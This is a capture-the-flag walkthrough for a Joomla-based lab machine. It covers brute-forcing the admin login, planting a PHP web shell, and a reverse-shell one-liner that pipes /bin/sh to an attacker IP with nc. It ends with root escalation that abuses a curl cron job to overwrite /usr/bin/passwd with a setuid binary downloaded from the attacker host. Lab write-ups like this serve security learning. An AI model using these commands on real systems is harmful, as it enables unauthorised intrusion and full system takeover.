# Reconnaissance
`$ nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.150`
`$ nmap -p 22,80 -sV -sC -oA nmap/scripts 10.10.10.150`
```
Nmap scan report for 10.10.10.150
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:d1:69:b4:90m:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Home
|_http-generator: Joomla! - Open Source Content Management
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.35 seconds
```

# Enumeration

## Port 80
`curl -s http://10.10.10.150/`
```
</body>
      <!-- secret.txt -->
</html>
```

`curl -s http://10.10.10.150/secret.txt`
```
Q3VybGluZzIwMTgh
```

`curl -s http://10.10.10.150/secret.txt | base64 -d`
```
Curling2018!
```

# Pre-Exploitation
`joomscan --ec --url 10.10.10.150 | tee joomscan.out`
`curl -s 10.10.10.150/administrator/manifests/files/joomla.xml | head`
```
<?xml version="1.0" encoding="UTF-8"?>
<extension version="3.6" type="file" method="upgrade">
        <name>files_joomla</name>
        <author>Joomla! Project</author>
        <authorEmail>admin@joomla.org</authorEmail>
        <authorUrl>www.joomla.org</authorUrl>
        <copyright>(C) 2005 - 2018 Open Source Matters. All rights reserved</copyright>
        <license>GNU General Public License version 2 or later; see LICENSE.txt</license>
        <version>3.8.8</version>
        <creationDate>May 2018</creationDate>
```

`searchsploit joomla 3.8`
```
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                        |  Path
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
Joomla! Component Appointments for JomSocial 3.8.1 - SQL Injection                                                    | php/webapps/41462.txt
Joomla! Component ContentMap 1.3.8 - 'contentid' SQL Injection                                                        | php/webapps/41427.txt
Joomla! Component Easydiscuss < 4.0.21 - Cross-Site Scripting                                                         | php/webapps/43488.txt
Joomla! Component Reverse Auction Factory 4.3.8 - SQL Injection                                                       | php/webapps/45475.txt
Joomla! Component Social Factory 3.8.3 - SQL Injection                                                                | php/webapps/45470.txt
Joomla! Component Store for K2 3.8.2 - SQL Injection                                                                  | php/webapps/41440.txt
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
No exploit that belong to Joomla 3.8.8

# Exploitation
## Bruteforce Login
1. Create wordlist with cewl: `cewl -w cewl.out 10.10.10.150`
2. Bruteforce through HTTP Proxy: `wfuzz -w cewl.out -c -d 'username=FUZZ&passwd=Curling2018%21&option=com_login&task=login&return=aW5kZXgucGhw&0a3ab5ecdcbc47a15beabc106e671004=1' -b '99fb082d992a92668ce87e5540bd20fa=96vrskpirtingik35nav7gh66m' -p 127.0.0.1:8080 <http://10.10.10.150/administrator/index.php>`
3. Login with credential: 
	`Username: floris`
	`Password: Curling2018!`

# Backdooring
## Upload Sheel via Joomla /administrator
1. Go to Extensions –> Templates –> Styles: Select **Beez3 - Default**
2. Click New File: Enter a file name and select a file type php.
3. Insert: `<?php system($_GET['cmd']); ?>`
4. Hit save at the top left of the page.

## Web Shell
- `curl -s http://10.10.10.150/templates/beez3/shell.php?cmd=cat%20/home/floris/password_backup`
- `curl -s http://10.10.10.150/templates/beez3/shell.php?cmd=cat%20/home/floris/password_backup | xxd -r > password_backup.bz2`

## Interactive Shell
- `nc -lvnp 80` & `curl -s http://10.10.10.150/templates/beez3/shell.php?cmd=cat%20/tmp/df%20|%20/bin/sh%20-i%202%3E%261%20|%20nc%2010.10.14.2%20443%20%3E%20/tmp/df`

## Extract password_backup
https://gchq.github.io/CyberChef/#recipe=From_Hexdump()Bzip2_Decompress()Gunzip()Bzip2_Decompress()Untar()Detect_File_Type(true,true,true,true,true,true,true/disabled)&input=MDAwMDAwMDA6IDQyNWEgNjgzOSAzMTQxIDU5MjYgNTM1OSA4MTliIGJiNDggMDAwMCAgQlpoOTFBWSZTWS4uLkguLgowMDAwMDAxMDogMTdmZiBmZmZjIDQxY2YgMDVmOSA1MDI5IDYxNzYgNjFjYyAzYTM0ICAuLi4uQS4uLlApYXZhLjo0CjAwMDAwMDIwOiA0ZWRjIGNjY2MgNmUxMSA1NDAwIDIzYWIgNDAyNSBmODAyIDE5NjAgIE4uLi5uLlQuIy5AJS4uLmAKMDAwMDAwMzA6IDIwMTggMGNhMCAwMDkyIDFjN2EgODM0MCAwMDAwIDAwMDAgMDAwMCAgIC4uLi4uLnouQC4uLi4uLgowMDAwMDA0MDogMDY4MCA2OTg4IDM0NjggNjQ2OSA4OWE2IGQ0MzkgZWE2OCBjODAwICAuLmkuNGhkaS4uLjkuaC4uCjAwMDAwMDUwOiAwMDBmIDUxYTAgMDA2NCA2ODFhIDA2OWUgYTE5MCAwMDAwIDAwMzQgIC4uUS4uZGguLi4uLi4uLjQKMDAwMDAwNjA6IDY5MDAgMDc4MSAzNTAxIDZlMTggYzJkNyA4Yzk4IDg3NGEgMTNhMCAgaS4uLjUubi4uLi4uLkouLgowMDAwMDA3MDogMDg2OCBhZTE5IGMwMmEgYjBjMSA3ZDc5IDJlYzIgM2M3ZSA5ZDc4ICAuaC4uLiouLn15Li48fi54CjAwMDAwMDgwOiBmNTNlIDA4MDkgZjA3MyA1NjU0IGMyN2EgNDg4NiBkZmEyIGU5MzEgIC4%2BLi4uc1ZULnpILi4uLjEKMDAwMDAwOTA6IGM4NTYgOTIxYiAxMjIxIDMzODUgNjA0NiBhMmRkIGMxNzMgMGQyMiAgLlYuLi4hMy5gRi4uLnMuIgowMDAwMDBhMDogYjk5NiA2ZWQ0IDBjZGIgODczNyA2YTNhIDU4ZWEgNjQxMSA1MjkwICAuLm4uLi4uN2o6WC5kLlIuCjAwMDAwMGIwOiBhZDZiIGIxMmYgMDgxMyA4MTIwIDgyMDUgYTVmNSAyOTcwIGM1MDMgIC5rLi8uLi4gLi4uLilwLi4KMDAwMDAwYzA6IDM3ZGIgYWIzYiBlMDAwIGVmODUgZjQzOSBhNDE0IDg4NTAgMTg0MyAgNy4uOy4uLi4uOS4uLlAuQwowMDAwMDBkMDogODI1OSBiZTUwIDA5ODYgMWU0OCA0MmQ1IDEzZWEgMWMyYSAwOThjICAuWS5QLi4uSEIuLi4uKi4uCjAwMDAwMGUwOiA4YTQ3IGFiMWQgMjBhNyA1NTQwIDcyZmYgMTc3MiA0NTM4IDUwOTAgIC5HLi4gLlVAci4uckU4UC4KMDAwMDAwZjA6IDgxOWIgYmI0OCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLi4uSA

Then login to SSH via :
`ssh floris@10.10.10.150` # password `5d<wdCbdZu)|hChXll`
# Privilege Escalation
Access the `/home/floris/admin-area`
```
drwxr-x--- 2 root floris 4096 May 22 2018 admin-area 
-rw-r--r-- 1 floris floris 1076 May 22 2018 password_backup 
-rw-r----- 1 floris floris 33 May 22 2018 user.txt
```

Download `pspy` 
`wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32`
`scp pspy32 floris@10.10.10.150:~/`

Run `pspy`
```
UID=0 PID=25426 | /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report 
UID=0 PID=25425 | sleep 1 
UID=0 PID=25424 | /bin/sh -c sleep 1; cat /root/default.txt > /home/floris/admin-area/input 
UID=0 PID=25423 | /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report 
UID=0 PID=25421 | /usr/sbin/CRON -f 
UID=0 PID=25420 | /usr/sbin/CRON -f
```

## Root Flag
1. Edit file input:
	```
	url = "file:///root/root.txt" 
	output = /tmp/flag
	```
2. After a minute, type: `cat /tmp/flag`

## Root Shell
1. Create script to overwrite a setuid binary.
	```
	void main() { 
		setuid(0); 
		setgid(0); 
		execl("/bin/sh","sh",0); 
	}
	```
2.  Compile it: `gcc -o setuid setuid.c`
3. Run the HTTP service: `python3 -m http.server 80`
4. Find root binary that can be overwrited: `find / -type f -user root -perm -4000 -ls 2>/dev/null`
5. Edit the file input: 
```
	url = "http://10.10.14.2/setuid" 
	output = /usr/bin/passwd
```
6. Run the `/usr/bin/passwd`
